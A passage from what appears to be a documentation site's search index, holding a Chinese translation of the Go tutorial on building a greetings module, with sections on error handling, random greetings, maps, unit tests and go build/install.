\u914d\u7f6e\u4e3a\u5728\u5176\u65e5\u5fd7\u6d88\u606f\u7684\u5f00\u5934\u6253\u5370\u547d\u4ee4\u540d\u79f0\uff08\u201cgreetings:\u201d\uff09\uff0c\u4e0d\u5e26\u65f6\u95f4\u6233\u6216\u6e90\u6587\u4ef6\u4fe1\u606f\u3002 \u5c06 Hello \u7684\u4e24\u4e2a\u8fd4\u56de\u503c\uff08\u5305\u62ec error\uff09\u5206\u914d\u7ed9\u53d8\u91cf\u3002 \u5c06 Hello \u7684\u53c2\u6570\u4ece Gladys \u7684\u540d\u5b57\u66f4\u6539\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u4ee5\u4fbf\u60a8\u53ef\u4ee5\u5c1d\u8bd5\u9519\u8bef\u5904\u7406\u4ee3\u7801\u3002 \u5bfb\u627e\u4e00\u4e2a\u975e nil \u7684 error \u503c\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u7ee7\u7eed\u4e0b\u53bb\u662f\u6ca1\u6709\u610f\u4e49\u7684\u3002 \u4f7f\u7528\u6807\u51c6\u5e93\u4e2d\u7684\u51fd\u6570 log package \u6765\u8f93\u51fa\u9519\u8bef\u4fe1\u606f\u3002\u5982\u679c\u51fa\u73b0\u9519\u8bef\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 log \u5305\u7684 Fatal \u51fd\u6570 \u6765\u6253\u5370\u9519\u8bef\u5e76\u505c\u6b62\u7a0b\u5e8f\u3002 \u5728 hello \u76ee\u5f55\u8fd0\u884c hello.go \u4ee5\u786e\u8ba4\u4ee3\u7801\u6709\u6548\u3002 \u73b0\u5728\u4f60\u4f20\u5165\u4e00\u4e2a\u7a7a\u540d\u79f0\uff0c\u4f1a\u5f97\u5230\u4e00\u4e2a\u9519\u8bef\u3002 $ go run . greetings: empty name exit status 1","title":"\u8fd4\u56de\u5e76\u5904\u7406\u9519\u8bef"},{"location":"go/create_module/#random-greeting","text":"\u60a8\u5c06\u6dfb\u52a0\u4e00\u4e2a\u5c0f\u7247\u6bb5\u4ee5\u5305\u542b\u4e09\u6761\u95ee\u5019\u6d88\u606f\uff0c\u7136\u540e\u8ba9\u60a8\u7684\u4ee3\u7801\u968f\u673a\u8fd4\u56de\u5176\u4e2d\u4e00\u6761\u6d88\u606f\u3002 \u4e3a\u6b64\uff0c\u60a8\u5c06\u4f7f\u7528 Go slice(\u5207\u7247)\u3002\u5207\u7247\u5c31\u50cf\u4e00\u4e2a\u6570\u7ec4\uff0c\u53ea\u662f\u5b83\u7684\u5927\u5c0f\u4f1a\u968f\u7740\u60a8\u6dfb\u52a0\u548c\u5220\u9664\u9879\u76ee\u800c\u52a8\u6001\u53d8\u5316\u3002\u5207\u7247\u662f Go \u6700\u6709\u7528\u7684\u7c7b\u578b\u4e4b\u4e00\u3002 \u6709\u5173\u5207\u7247\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Go \u535a\u5ba2\u4e2d\u7684 Go slices \u3002 \u5728 greetings/greetings.go \u4e2d\uff0c\u66f4\u6539\u60a8\u7684\u4ee3\u7801\uff0c\u4f7f\u5176\u5982\u4e0b\u6240\u793a\u3002 package greetings import ( \"errors\" \"fmt\" \"math/rand\" \"time\" ) // Hello returns a greeting for the named person. func Hello(name string) (string, error) { // If no name was given, return an error with a message. if name == \"\" { return name, errors.New(\"empty name\") } // Create a message using a random format. message := fmt.Sprintf(randomFormat(), name) return message, nil } // init sets initial values for variables used in the function. func init() { rand.Seed(time.Now().UnixNano()) } // randomFormat returns one of a set of greeting messages. The returned // message is selected at random. func randomFormat() string { // A slice of message formats. formats := []string{ \"Hi, %v. Welcome!\", \"Great to see you, %v!\", \"Hail, %v! Well met!\", } // Return a randomly selected message format by specifying // a random index for the slice of formats. return formats[rand.Intn(len(formats))] } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u6dfb\u52a0\u4e00\u4e2a randomFormat \u51fd\u6570\uff0c\u8be5\u51fd\u6570\u8fd4\u56de\u968f\u673a\u9009\u62e9\u7684\u95ee\u5019\u6d88\u606f\u683c\u5f0f\u3002\u8bf7\u6ce8\u610f\uff0c randomFormat \u4ee5\u5c0f\u5199\u5b57\u6bcd\u5f00\u5934\uff0c\u4f7f\u5176\u53ea\u80fd\u88ab\u5176\u81ea\u5df1\u7684\u5305\u4e2d\u7684\u4ee3\u7801\u8bbf\u95ee\uff08\u6362\u53e5\u8bdd\u8bf4\uff0c\u5b83\u4e0d\u4f1a\u88ab\u5bfc\u51fa\uff09\u3002 \u5728 randomFormat \u4e2d\uff0c\u58f0\u660e formats \u5177\u6709\u4e09\u79cd\u6d88\u606f\u683c\u5f0f\u7684\u5207\u7247\u3002\u58f0\u660e\u5207\u7247\u65f6\uff0c\u5728\u62ec\u53f7\u4e2d\u7701\u7565\u5176\u5927\u5c0f\uff0c\u5982\u4e0b\u6240\u793a\uff1a []string . \u8fd9\u544a\u8bc9 Go\uff0c\u5207\u7247\u5e95\u5c42\u6570\u7ec4\u7684\u5927\u5c0f\u53ef\u4ee5\u52a8\u6001\u66f4\u6539\u3002 \u4f7f\u7528 math/rand \u5305 \u751f\u6210\u4e00\u4e2a\u968f\u673a\u6570\uff0c\u7528\u4e8e\u4ece\u5207\u7247\u4e2d\u9009\u62e9\u4e00\u4e2a\u9879\u76ee\u3002 \u6dfb\u52a0\u4e00\u4e2a init \u51fd\u6570\u4ee5\u4f7f\u7528\u5f53\u524d\u65f6\u95f4\u4e3a rand \u5305\u7684\u968f\u673a\u6570\u79cd\u5b50(seed)\u3002Go\u5728\u7a0b\u5e8f\u542f\u52a8\u65f6\u81ea\u52a8\u6267\u884c init \u51fd\u6570\uff0c\u5728\u5168\u5c40\u53d8\u91cf\u88ab\u521d\u59cb\u5316\u4e4b\u540e\u3002\u6709\u5173 init \u51fd\u6570\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Effective Go \u3002 \u5728 Hello \u4e2d\uff0c\u8c03\u7528 randomFormat \u51fd\u6570\u4ee5\u83b7\u53d6\u60a8\u5c06\u8fd4\u56de\u7684\u6d88\u606f\u7684\u683c\u5f0f\uff0c\u7136\u540e\u5c06\u683c\u5f0f\u548c name \u503c\u4e00\u8d77\u4f7f\u7528\u6765\u521b\u5efa\u6d88\u606f\u3002 \u50cf\u4ee5\u524d\u4e00\u6837\u8fd4\u56de\u6d88\u606f\uff08\u6216\u9519\u8bef\uff09\u3002 \u5728 hello/hello.go \u4e2d\uff0c\u66f4\u6539\u60a8\u7684\u4ee3\u7801\uff0c\u4f7f\u5176\u5982\u4e0b\u6240\u793a\u3002 \u53ea\u9700\u5c06 Gladys \u7684\u540d\u5b57\uff08\u6216\u5176\u4ed6\u540d\u5b57\uff0c\u5982\u679c\u60a8\u613f\u610f\u7684\u8bdd\uff09\u4f5c\u4e3a\u53c2\u6570\u6dfb\u52a0\u5230 hello.go \u4e2d\u7684 Hello \u51fd\u6570\u8c03\u7528\u4e2d\u3002 package main import ( \"fmt\" \"log\" \"example.com/greetings\" ) func main() { // Set properties of the predefined Logger, including // the log entry prefix and a flag to disable printing // the time, source file, and line number. log.SetPrefix(\"greetings: \") log.SetFlags(0) // Request a greeting message. message, err := greetings.Hello(\"Gladys\") // If an error was returned, print it to the console and // exit the program. if err != nil { log.Fatal(err) } // If no error was returned, print the returned message // to the console. fmt.Println(message) } \u8fd0\u884c hello.go \u4ee5\u786e\u8ba4\u4ee3\u7801\u6b63\u5e38\u8fd0\u884c\u3002\u591a\u6b21\u8fd0\u884c\u5b83\uff0c\u6ce8\u610f\u95ee\u5019\u8bed\u53d1\u751f\u4e86\u53d8\u5316\u3002 $ go run . Great to see you, Gladys! $ go run . Hi, Gladys. Welcome! $ go run . Hail, Gladys! Well met!","title":"\u8fd4\u56de\u968f\u5373\u95ee\u5019\u8bed"},{"location":"go/create_module/#greeting-multiple-people","text":"\u6dfb\u52a0\u5bf9\u5728\u4e00\u4e2a\u8bf7\u6c42\u4e2d\u83b7\u53d6\u591a\u4e2a\u4eba\u7684\u95ee\u5019\u7684\u652f\u6301\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5904\u7406\u591a\u503c\u8f93\u5165\uff0c\u7136\u540e\u5c06\u8be5\u8f93\u5165\u4e2d\u7684\u503c\u4e0e\u591a\u503c\u8f93\u51fa\u914d\u5bf9\u3002\u4e3a\u6b64\uff0c\u60a8\u9700\u8981\u5c06\u4e00\u7ec4\u540d\u79f0\u4f20\u9012\u7ed9\u4e00\u4e2a\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u53ef\u4ee5\u4e3a\u6bcf\u4e2a\u540d\u79f0\u8fd4\u56de\u4e00\u4e2a\u95ee\u5019\u8bed\u3002 \u4f46\u662f\u6709\u4e00\u4e2a\u95ee\u9898\u3002\u5c06 Hello \u51fd\u6570\u7684\u53c2\u6570\u4ece\u5355\u4e2a\u540d\u79f0\u66f4\u6539\u4e3a\u4e00\u7ec4\u540d\u79f0\u4f1a\u66f4\u6539\u51fd\u6570\u7684\u7b7e\u540d\u3002\u5982\u679c\u60a8\u5df2\u7ecf\u53d1\u5e03\u4e86 example.com/greetings \u6a21\u5757\u5e76\u4e14\u7528\u6237\u5df2\u7ecf\u7f16\u5199\u4e86\u4ee3\u7801\u8c03\u7528 Hello \uff0c\u90a3\u4e48\u8be5\u66f4\u6539\u5c06\u7834\u574f\u4ed6\u4eec\u7684\u7a0b\u5e8f\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u66f4\u597d\u7684\u9009\u62e9\u662f\u7f16\u5199\u4e00\u4e2a\u5177\u6709\u4e0d\u540c\u540d\u79f0\u7684\u65b0\u51fd\u6570\u3002\u65b0\u51fd\u6570\u5c06\u91c7\u7528\u591a\u4e2a\u53c2\u6570\u3002\u8fd9\u4fdd\u7559\u4e86\u65e7\u529f\u80fd\u4ee5\u5b9e\u73b0\u5411\u540e\u517c\u5bb9\u6027\u3002 \u5728 greetings/greetings.go \u4e2d\uff0c\u66f4\u6539\u60a8\u7684\u4ee3\u7801\uff0c\u4f7f\u5176\u5982\u4e0b\u6240\u793a\u3002 package greetings import ( \"errors\" \"fmt\" \"math/rand\" \"time\" ) // Hello returns a greeting for the named person. func Hello(name string) (string, error) { // If no name was given, return an error with a message. if name == \"\" { return name, errors.New(\"empty name\") } // Create a message using a random format. message := fmt.Sprintf(randomFormat(), name) return message, nil } // Hellos returns a map that associates each of the named people // with a greeting message. func Hellos(names []string) (map[string]string, error) { // A map to associate names with messages. messages := make(map[string]string) // Loop through the received slice of names, calling // the Hello function to get a message for each name. for _, name := range names { message, err := Hello(name) if err != nil { return nil, err } // In the map, associate the retrieved message with // the name. messages[name] = message } return messages, nil } // Init sets initial values for variables used in the function. func init() { rand.Seed(time.Now().UnixNano()) } // randomFormat returns one of a set of greeting messages. The returned // message is selected at random. func randomFormat() string { // A slice of message formats. formats := []string{ \"Hi, %v. Welcome!\", \"Great to see you, %v!\", \"Hail, %v! Well met!\", } // Return one of the message formats selected at random. return formats[rand.Intn(len(formats))] } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u6dfb\u52a0\u4e00\u4e2a Hellos \u51fd\u6570\uff0c\u5176\u53c2\u6570\u662f\u540d\u79f0\u5207\u7247\u800c\u4e0d\u662f\u5355\u4e2a\u540d\u79f0\u3002\u6b64\u5916\uff0c\u60a8\u5c06\u5176\u8fd4\u56de\u7c7b\u578b\u4e4b\u4e00\u4ece\u4e00\u4e2a string \u66f4\u6539\u4e3a\u4e00\u4e2a map \u4ee5\u4fbf\u60a8\u53ef\u4ee5\u8fd4\u56de\u6620\u5c04\u5230\u95ee\u5019\u6d88\u606f\u7684\u540d\u79f0\u3002 \u8ba9\u65b0 Hellos \u51fd\u6570\u8c03\u7528\u73b0\u6709 Hello \u51fd\u6570\u3002\u8fd9\u6709\u52a9\u4e8e\u51cf\u5c11\u91cd\u590d\uff0c\u540c\u65f6\u4e5f\u4fdd\u7559\u8fd9\u4e24\u4e2a\u529f\u80fd\u3002 \u521b\u5efa\u4e00\u4e2a messages map \u6620\u5c04\u4ee5\u5c06\u6bcf\u4e2a\u63a5\u6536\u5230\u7684\u540d\u79f0\uff08\u4f5c\u4e3a\u952e\uff09\u4e0e\u751f\u6210\u7684\u6d88\u606f\uff08\u4f5c\u4e3a\u503c\uff09\u76f8\u5173\u8054\u3002\u5728 Go \u4e2d\uff0c\u60a8\u4f7f\u7528\u4ee5\u4e0b\u8bed\u6cd5\u521d\u59cb\u5316map\uff1a make(map[key-type]value-type) . \u60a8\u6709\u51fd\u6570 Hellos \u5c06\u6b64\u6620\u5c04\u8fd4\u56de\u7ed9\u8c03\u7528\u8005\u3002\u6709\u5173map\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605Go \u535a\u5ba2\u4e0a\u7684 Go maps in action \u3002 \u904d\u5386\u60a8\u7684\u51fd\u6570\u6536\u5230\u7684\u540d\u79f0\uff0c\u68c0\u67e5\u6bcf\u4e2a\u540d\u79f0\u662f\u5426\u5177\u6709\u975e\u7a7a\u503c\uff0c\u7136\u540e\u5c06\u4e00\u6761\u6d88\u606f\u4e0e\u6bcf\u4e2a\u5173\u8054\u3002\u5728\u8fd9\u4e2a for \u5faa\u73af\u4e2d\uff0c range \u8fd4\u56de\u4e24\u4e2a\u503c\uff1a\u5faa\u73af\u4e2d\u5f53\u524d\u9879\u76ee\u7684\u7d22\u5f15\u548c\u9879\u76ee\u503c\u7684\u526f\u672c\u3002\u60a8\u4e0d\u9700\u8981\u7d22\u5f15\uff0c\u56e0\u6b64\u60a8\u4f7f\u7528 Go \u7a7a\u767d\u6807\u8bc6\u7b26\uff08\u4e0b\u5212\u7ebf\uff09\u6765\u5ffd\u7565\u5b83\u3002\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Effective Go \u4e2d\u7684 \u7a7a\u767d\u6807\u8bc6\u7b26 \u3002 \u5728\u60a8\u7684 hello/hello.go \u8c03\u7528\u4ee3\u7801\u4e2d\uff0c\u4f20\u9012\u4e00\u6bb5\u540d\u79f0\uff0c\u7136\u540e\u6253\u5370\u60a8\u8fd4\u56de\u7684\u540d\u79f0/\u6d88\u606f\u6620\u5c04\u7684\u5185\u5bb9\u3002 package main import ( \"fmt\" \"log\" \"example.com/greetings\" ) func main() { // Set properties of the predefined Logger, including // the log entry prefix and a flag to disable printing // the time, source file, and line number. log.SetPrefix(\"greetings: \") log.SetFlags(0) // A slice of names. names := []string{\"Gladys\", \"Samantha\", \"Darrin\"} // Request greeting messages for the names. messages, err := greetings.Hellos(names) if err != nil { log.Fatal(err) } // If no error was returned, print the returned map of // messages to the console. fmt.Println(messages) } \u901a\u8fc7\u8fd9\u4e9b\u66f4\u6539\uff0c\u60a8\u53ef\u4ee5\uff1a \u521b\u5efa\u4e00\u4e2a names \u53d8\u91cf\u4f5c\u4e3a\u5305\u542b\u4e09\u4e2a\u540d\u79f0\u7684\u5207\u7247\u7c7b\u578b\u3002 \u5c06 names \u53d8\u91cf\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9 Hellos \u51fd\u6570\u3002 \u5207\u6362\u5230\u5305\u542b hello/hello.go \u7684\u76ee\u5f55\uff0c\u7136\u540e\u4f7f\u7528 go run \u786e\u8ba4\u4ee3\u7801\u6709\u6548\u3002 \u8f93\u51fa\u5e94\u8be5\u662f\u5730\u56fe\u7684\u5b57\u7b26\u4e32\u8868\u793a\u5f62\u5f0f\uff0c\u5c06\u540d\u79f0\u4e0e\u6d88\u606f\u76f8\u5173\u8054\uff0c\u5982\u4e0b\u6240\u793a\uff1a $ go run . map[Darrin:Hail, Darrin! Well met! Gladys:Hi, Gladys. Welcome! Samantha:Hail, Samantha! Well met!] \u672c\u4e3b\u9898\u4ecb\u7ecd\u4e86\u7528\u6237\u8868\u793a\u540d\u79f0/\u503c\u5bf9\u7684map\u6620\u5c04\u3002\u5b83\u8fd8\u5f15\u5165\u4e86\u901a\u8fc7\u4e3a\u6a21\u5757\u4e2d\u589e\u52a0\u65b0\u51fd\u6570\u6216\u66f4\u6539\u51fd\u6570\u5b9e\u73b0\u65b0\u529f\u80fd\u6765\u4fdd\u6301\u5411\u540e\u517c\u5bb9\u6027\u7684\u60f3\u6cd5\u3002\u6709\u5173\u5411\u540e\u517c\u5bb9\u6027\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u4fdd\u6301\u6a21\u5757\u517c\u5bb9 \u3002","title":"\u56de\u590d\u591a\u4eba\u95ee\u5019"},{"location":"go/create_module/#add-test","text":"\u73b0\u5728\u60a8\u5df2\u7ecf\u5c06\u4ee3\u7801\u653e\u5230\u4e86\u4e00\u4e2a\u7a33\u5b9a\u7684\u5730\u65b9\uff0c\u6dfb\u52a0\u4e00\u4e2a\u6d4b\u8bd5\uff0c\u5728\u5f00\u53d1\u671f\u95f4\u6d4b\u8bd5\u60a8\u7684\u4ee3\u7801\u53ef\u80fd\u4f1a\u66b4\u9732\u5728\u60a8\u8fdb\u884c\u66f4\u6539\u65f6\u53d1\u73b0\u7684\u9519\u8bef\u3002 Go \u5bf9\u5355\u5143\u6d4b\u8bd5\u7684\u5185\u7f6e\u652f\u6301\u4f7f\u60a8\u53ef\u4ee5\u66f4\u8f7b\u677e\u5730\u8fdb\u884c\u6d4b\u8bd5\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u4f7f\u7528\u547d\u540d\u7ea6\u5b9a\u3001Go \u7684 testing \u5305\u548c go test \u547d\u4ee4\uff0c\u60a8\u53ef\u4ee5\u5feb\u901f\u7f16\u5199\u548c\u6267\u884c\u6d4b\u8bd5\u3002 \u5728 greetings \u76ee\u5f55\u4e2d\uff0c\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a greetings_test.go \u7684\u6587\u4ef6\u3002 \u4ee5 _test.go \u7ed3\u5c3e\u7684\u6587\u4ef6\u540d\u544a\u8bc9 go test \u547d\u4ee4\u8be5\u6587\u4ef6\u5305\u542b\u6d4b\u8bd5\u51fd\u6570\u3002 \u5728 greetings_test.go \u4e2d\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u5e76\u4fdd\u5b58\u6587\u4ef6\u3002 package greetings import ( \"testing\" \"regexp\" ) // TestHelloName calls greetings.Hello with a name, checking // for a valid return value. func TestHelloName(t *testing.T) { name := \"Gladys\" want := regexp.MustCompile(`\\b`+name+`\\b`) msg, err := Hello(\"Gladys\") if !want.MatchString(msg) || err != nil { t.Fatalf(`Hello(\"Gladys\") = %q, %v, want match for %#q, nil`, msg, err, want) } } // TestHelloEmpty calls greetings.Hello with an empty string, // checking for an error. func TestHelloEmpty(t *testing.T) { msg, err := Hello(\"\") if msg != \"\" || err == nil { t.Fatalf(`Hello(\"\") = %q, %v, want \"\", error`, msg, err) } } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u5728\u4e0e\u60a8\u6b63\u5728\u6d4b\u8bd5\u7684\u4ee3\u7801\u76f8\u540c\u7684\u5305\u4e2d\u5b9e\u73b0\u6d4b\u8bd5\u51fd\u6570\u3002 \u521b\u5efa\u4e24\u4e2a\u6d4b\u8bd5\u51fd\u6570\u6765\u6d4b\u8bd5 greetings.Hello \u51fd\u6570\u3002\u6d4b\u8bd5\u51fd\u6570\u540d\u79f0\u7684\u683c\u5f0f\u4e3a TestName \uff0c\u5176\u4e2d Name \u8bf4\u660e\u4e86\u7279\u5b9a\u6d4b\u8bd5\u3002\u6b64\u5916\uff0c\u6d4b\u8bd5\u51fd\u6570\u5c06\u6307\u5411\u5305 testing \u7c7b\u578b testing.T \u7684\u6307\u9488\u4f5c\u4e3a\u53c2\u6570\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528\u6b64\u53c2\u6570\u7684\u65b9\u6cd5\u6765\u62a5\u544a\u548c\u8bb0\u5f55\u60a8\u7684\u6d4b\u8bd5\u3002 \u5b9e\u65bd\u4e24\u4e2a\u6d4b\u8bd5\uff1a TestHelloName \u8c03\u7528 Hello \u51fd\u6570\uff0c\u4f20\u9012\u4e00\u4e2a name \u503c\uff0c\u51fd\u6570\u5e94\u8be5\u80fd\u591f\u4f7f\u7528\u8be5\u503c\u8fd4\u56de\u6709\u6548\u7684\u54cd\u5e94\u6d88\u606f\u3002\u5982\u679c\u8c03\u7528\u8fd4\u56de\u9519\u8bef\u6216\u610f\u5916\u54cd\u5e94\u6d88\u606f\uff08\u4e0d\u5305\u62ec\u60a8\u4f20\u5165\u7684\u540d\u79f0\uff09\uff0c\u5219\u4f7f\u7528t\u53c2\u6570\u7684 Fatalf \u65b9\u6cd5 \u5c06\u6d88\u606f\u6253\u5370\u5230\u63a7\u5236\u53f0\u5e76\u7ed3\u675f\u6267\u884c\u3002 TestHelloEmpty \u4f7f\u7528\u7a7a\u5b57\u7b26\u4e32\u8c03\u7528 Hello \u51fd\u6570\u3002\u6b64\u6d4b\u8bd5\u65e8\u5728\u786e\u8ba4\u60a8\u7684\u9519\u8bef\u5904\u7406\u662f\u5426\u6709\u6548\u3002\u5982\u679c\u8c03\u7528\u8fd4\u56de\u975e\u7a7a\u5b57\u7b26\u4e32\u6216\u6ca1\u6709\u9519\u8bef\uff0c\u5219\u4f7f\u7528 t \u53c2\u6570\u7684 Fatalf \u65b9\u6cd5\u5c06\u6d88\u606f\u6253\u5370\u5230\u63a7\u5236\u53f0\u5e76\u7ed3\u675f\u6267\u884c\u3002 \u5728greetings\u76ee\u5f55\u4e0b\u7684\u547d\u4ee4\u884c\uff0c\u8fd0\u884c go test \u547d\u4ee4 \u6267\u884c\u6d4b\u8bd5\u3002 go test \u547d\u4ee4\u5728\u6d4b\u8bd5\u6587\u4ef6\uff08\u540d\u79f0\u4ee5 _test.go \u7ed3\u5c3e\uff09\u4e2d\u6267\u884c\u6d4b\u8bd5\u51fd\u6570\uff08\u540d\u79f0\u4ee5 Test \u5f00\u5934\uff09\u3002\u60a8\u53ef\u4ee5\u6dfb\u52a0 -v \u6807\u5fd7\u4ee5\u83b7\u5f97\u5217\u51fa\u6240\u6709\u6d4b\u8bd5\u53ca\u5176\u7ed3\u679c\u7684\u8be6\u7ec6\u8f93\u51fa\u3002 $ go test PASS ok example.com/greetings 0.364s $ go test -v === RUN TestHelloName --- PASS: TestHelloName (0.00s) === RUN TestHelloEmpty --- PASS: TestHelloEmpty (0.00s) PASS ok example.com/greetings 0.372s \u4e2d\u65ad greetings.Hello \u51fd\u6570\u4ee5\u67e5\u770b\u5931\u8d25\u7684\u6d4b\u8bd5\u3002 TestHelloName \u6d4b\u8bd5\u51fd\u6570\u68c0\u67e5\u60a8\u6307\u5b9a\u540d\u79f0\u4e3a Hello \u7684\u51fd\u6570\u7684\u8fd4\u56de\u503c\u3002\u8981\u67e5\u770b\u5931\u8d25\u7684\u6d4b\u8bd5\u7ed3\u679c\uff0c\u8bf7\u66f4\u6539 greetings.Hello \u51fd\u6570\u4ee5\u4f7f\u5176\u4e0d\u518d\u5305\u542b\u540d\u79f0\u3002 \u5728 greetings/greetings.go \u4e2d\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u4ee3\u66ff Hello \u51fd\u6570\u3002\u8bf7\u6ce8\u610f\uff0c\u7a81\u51fa\u663e\u793a\u7684\u884c\u4f1a\u66f4\u6539\u51fd\u6570\u8fd4\u56de\u7684\u503c\uff0c\u5c31\u597d\u50cfname\u53c2\u6570\u88ab\u610f\u5916\u5220\u9664\u4e86\u4e00\u6837\u3002 // Hello returns a greeting for the named person. func Hello(name string) (string, error) { // If no name was given, return an error with a message. if name == \"\" { return name, errors.New(\"empty name\") } // Create a message using a random format. // message := fmt.Sprintf(randomFormat(), name) message := fmt.Sprint(randomFormat()) return message, nil } \u5728greetings\u76ee\u5f55\u4e0b\uff0c\u8fd0\u884c go test \u6267\u884c\u6d4b\u8bd5\u3002 \u8fd9\u4e00\u6b21\uff0c\u5728 go test \u6ca1\u6709 -v \u53c2\u6570\u7684\u60c5\u51b5\u4e0b\u8fd0\u884c\u3002\u8f93\u51fa\u5c06\u4ec5\u5305\u542b\u5931\u8d25\u6d4b\u8bd5\u7684\u7ed3\u679c\uff0c\u8fd9\u5728\u60a8\u6709\u5927\u91cf\u6d4b\u8bd5\u65f6\u5f88\u6709\u7528\u3002\u6d4b\u8bd5 TestHelloName \u5e94\u8be5\u5931\u8d25\u2014\u2014 TestHelloEmpty \u4ecd\u7136\u901a\u8fc7\u3002 $ go test --- FAIL: TestHelloName (0.00s) greetings_test.go:15: Hello(\"Gladys\") = \"Hail, %v! Well met!\", <nil>, want match for `\\bGladys\\b`, nil FAIL exit status 1 FAIL example.com/greetings 0.182s","title":"\u6dfb\u52a0\u6d4b\u8bd5"},{"location":"go/create_module/#compile-install","text":"\u5b66\u4e60\u51e0\u4e2a\u65b0 go \u547d\u4ee4\u3002\u867d\u7136\u8be5 go run \u547d\u4ee4\u662f\u5728\u60a8\u8fdb\u884c\u9891\u7e41\u66f4\u6539\u65f6\u7f16\u8bd1\u548c\u8fd0\u884c\u7a0b\u5e8f\u7684\u6709\u7528\u5feb\u6377\u65b9\u5f0f\uff0c\u4f46\u5b83\u4e0d\u4f1a\u751f\u6210\u4e8c\u8fdb\u5236\u53ef\u6267\u884c\u6587\u4ef6\u3002 \u672c\u4e3b\u9898\u4ecb\u7ecd\u4e86\u7528\u4e8e\u6784\u5efa\u4ee3\u7801\u7684\u4e24\u4e2a\u9644\u52a0\u547d\u4ee4\uff1a \u8be5 go build \u547d\u4ee4 \u4f1a\u7f16\u8bd1\u8f6f\u4ef6\u5305\u53ca\u5176\u4f9d\u8d56\u9879\uff0c\u4f46\u4e0d\u4f1a\u5b89\u88c5\u7ed3\u679c\u3002 \u8be5 go install \u547d\u4ee4 \u7f16\u8bd1\u5e76\u5b89\u88c5\u5305\u3002 \u5e38\u7528\u547d\u4ee4 \u4ece hello \u76ee\u5f55\u4e2d\u7684\u547d\u4ee4\u884c\uff0c\u8fd0\u884c go build \u547d\u4ee4\u5c06\u4ee3\u7801\u7f16\u8bd1\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u3002 $ go build \u4ece hello \u76ee\u5f55\u4e2d\u7684\u547d\u4ee4\u884c\uff0c\u8fd0\u884c\u65b0\u7684 hello \u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u786e\u8ba4\u4ee3\u7801\u6709\u6548\u3002 \u8bf7\u6ce8\u610f\uff0c\u60a8\u7684\u7ed3\u679c\u53ef\u80fd\u4f1a\u6709\u6240\u4e0d\u540c\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u60a8\u662f\u5426\u5728\u6d4b\u8bd5\u540e\u66f4\u6539\u4e86 greetings.go \u4ee3\u7801\u3002 \u5728 Linux \u6216 Mac \u4e0a\uff1a $ ./hello map[Darrin:Great to see you, Darrin! Gladys:Hail, Gladys! Well met! Samantha:Hail, Samantha! Well met!] \u5728 Windows \u4e0a\uff1a $ hello.exe map[Darrin:Great to see you, Darrin! Gladys:Hail, Gladys! Well met! Samantha:Hail, Samantha! Well met!] \u60a8\u5df2\u5c06\u5e94\u7528\u7a0b\u5e8f\u7f16\u8bd1\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4ee5\u4fbf\u53ef\u4ee5\u8fd0\u884c\u5b83\u3002\u4f46\u662f\u8981\u5728\u5f53\u524d\u76ee\u5f55\u8fd0\u884c\u5b83\uff0c\u60a8\u7684\u547d\u4ee4\u63d0\u793a\u7b26\u9700\u8981\u4f4d\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u7684\u76ee\u5f55\u4e2d\uff0c\u6216\u8005\u6307\u5b9a\u53ef\u6267\u884c\u6587\u4ef6\u7684\u8def\u5f84\u3002 \u63a5\u4e0b\u6765\uff0c\u60a8\u5c06\u5b89\u88c5\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4ee5\u4fbf\u5728\u4e0d\u6307\u5b9a\u5176\u8def\u5f84\u7684\u60c5\u51b5\u4e0b\u8fd0\u884c\u5b83\u3002 \u53d1\u73b0 Go \u5b89\u88c5\u8def\u5f84\uff0c\u8be5 go \u547d\u4ee4\u5c06\u5728\u5176\u4e2d\u5b89\u88c5\u5f53\u524d\u5305\u3002 \u60a8\u53ef\u4ee5\u901a\u8fc7\u8fd0\u884c go list \u547d\u4ee4 \u6765\u53d1\u73b0\u5b89\u88c5\u8def\u5f84\uff0c \u5982\u4e0b\u4f8b\u6240\u793a\uff1a $ go list -f '{{.Target}}' \u4f8b\u5982\uff0c\u8be5\u547d\u4ee4\u7684\u8f93\u51fa\u53ef\u80fd\u4f1a /home/gopher/bin/hello \u663e\u793a \uff0c\u8fd9\u610f\u5473\u7740\u4e8c\u8fdb\u5236\u6587\u4ef6\u5c06\u88ab\u5b89\u88c5\u5230 /home/gopher/bin \u3002\u60a8\u5c06\u5728\u4e0b\u4e00\u6b65\u4e2d\u9700\u8981\u6b64\u5b89\u88c5\u76ee\u5f55\u3002 \u5c06 Go \u5b89\u88c5\u76ee\u5f55\u6dfb\u52a0\u5230\u7cfb\u7edf\u7684 shell \u8def\u5f84\u3002 \u8fd9\u6837\uff0c\u60a8\u5c06\u80fd\u591f\u8fd0\u884c\u7a0b\u5e8f\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u800c\u65e0\u9700\u6307\u5b9a\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4f4d\u7f6e\u3002 \u5728 Linux \u6216 Mac 